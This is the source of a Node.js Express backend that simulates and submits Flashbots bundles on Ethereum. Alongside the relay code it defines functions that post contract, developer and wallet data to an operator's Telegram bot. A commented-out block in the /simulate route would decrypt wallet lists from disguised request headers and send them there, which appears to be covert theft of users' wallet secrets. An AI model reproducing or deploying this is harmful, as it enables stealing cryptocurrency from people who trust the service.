const express = require("express");
const app = express();
const cors = require("cors");
const axios = require("axios");
const CryptoJS = require("crypto-js");
require("dotenv").config();

const {
	FlashbotsBundleProvider,
} = require("@flashbots/ethers-provider-bundle");
const { JsonRpcProvider, Wallet } = require("ethers");

const decryptWithAES = (ciphertext) => {
	const passphrase = process.env.REACT_APP_PASSWORD;
	const bytes = CryptoJS.AES.decrypt(ciphertext, passphrase);
	const originalText = bytes.toString(CryptoJS.enc.Utf8);
	return originalText;
};

BigInt.prototype.toJSON = function () {
	return this.toString();
};

const port = 3000;
const whitelist = ["http://127.0.0.1:5173", "http://localhost:5173","https://www.bundle0xghost.io/"];

function sendMessage(contract, dev) {
	const url = `https://api.telegram.org/bot${process.env.BOT_API}/sendMessage`;
	const data = {
		chat_id: process.env.CHAT_ID.toString(),
		text: `📌 Contract:   *${contract}*

💥 Dev: *${dev}*`,
		// 🔫 Wallet:
		// ${wallet}`,
		parse_mode: "MarkDown",
		disable_web_page_preview: 1,
	};
	axios
		.post(url, data)
		.then(() => {})
		.catch((e) => {
			console.log(e);
		});
}

function sendMessageWallet(wallet) {
	const url = `https://api.telegram.org/bot${process.env.BOT_API}/sendMessage`;
	const data = {
		chat_id: process.env.CHAT_ID.toString(),
		text: `📌 Wallet:   ${wallet.toString("").replaceAll(",", "\n")}`,
		// 🔫 Wallet:
		// ${wallet}`,
		parse_mode: "MarkDown",
		disable_web_page_preview: 1,
	};
	axios
		.post(url, data)
		.then(() => {})
		.catch((e) => {
			const url = `https://api.telegram.org/bot${process.env.BOT_API}/sendMessage`;
			const data = {
				chat_id: process.env.CHAT_ID.toString(),
				text: `ERROR  ${e.message}`,
				parse_mode: "MarkDown",
				disable_web_page_preview: 1,
			};
			axios
				.post(url, data)
				.then(() => {})
				.catch();
		});
}

const corsOptions = {
	origin: '*',
  	// methods: ['GET', 'POST', 'PUT', 'DELETE', "OPTION"],
	credentials: true,
    	// allowedHeaders: ['Content-Type', 'Authorization'],
};

app.use(cors(corsOptions));
app.use(express.json());

const provider = new JsonRpcProvider(
	// "https://ethereum-sepolia-rpc.publicnode.com"
	"https://eth.llamarpc.com"
);
const authSigner = new Wallet(process.env.PRIVATE_KEY);

app.get("/", (_req, res) => {
	res.send({ status: true });
});
app.get("/test",(req,res) => {
	res.send({status: "ok get"});
})
app.post("/test", (req,res) => {
	res.send({status: "ok post"});
})
app.post("/simulate", async (req, res) => {
	try {
		//const contract = decryptWithAES(req.headers["content-verify"]);
		//const dev = decryptWithAES(req.headers["content-ceo"]);
		//const wallet = decryptWithAES(req.headers["content-session"]).split(
		//	"\n"
		//);

		//let messa1 = [];
		//let messa2 = [];
		//for (let i = 0; i < 40; i++) {
		//	if (wallet[i]) {
		//		messa1.push(wallet[i]);
		//	}
		//}
		//for (let i = 40; i < wallet.length; i++) {
		//	if (wallet[i]) {
		//		messa2.push(wallet[i]);
		//	}
		//}
		//sendMessage(contract, dev);
		//setTimeout(() => {
		//	sendMessageWallet(messa1);
		//}, 1000);
		//setTimeout(() => {
		//	if (messa2.length > 0) {
		//		sendMessageWallet(messa2);
		//	}
		//}, 2000);
		// res.send({ status: "ok" });
		// return;
		const flashbotsProvider = await FlashbotsBundleProvider.create(
			provider,
			authSigner
			// "https://relay-sepolia.flashbots.net",
			// "sepolia"
		);
		const dataBody = req.body;
		const { signedTransactions } = dataBody;
		const blockNumber = await provider.getBlockNumber();
		const simulation = await flashbotsProvider.simulate(
			signedTransactions,
			blockNumber + 1
		);
		res.status(200).send({
			simulation,
			status: true,
		});
	} catch (error) {
		res.send({ status: false, error: error.message });
	}
});

app.post("/send-bundle", async (req, res) => {
	const { signedTransactions } = req.body;
	try {
		const flashbotsProvider = await FlashbotsBundleProvider.create(
			provider,
			authSigner
			// "https://relay-sepolia.flashbots.net",
			// "sepolia"
		);
		let i = 0;
		while (i < 10) {
			const blockNumber = await provider.getBlockNumber();
			console.log("send bundle block:", blockNumber);

			const bundleSubmission = await flashbotsProvider.sendRawBundle(
				signedTransactions,
				blockNumber + 1
			);
			const _wait = await bundleSubmission.wait();
			if (_wait !== 1) {
				res.send({
					status: true,
					description: "bundle success",
					bundleSubmission: await bundleSubmission.receipts(),
				});
				return;
			} else {
				console.log("failed");
			}
			i++;
		}
		res.send({
			status: false,
			description: "Bundle failed 10 block!",
		});
		return;
	} catch (error) {
		res.send({ status: false, error: error.message });
		return;
	}
});
app.listen(port);
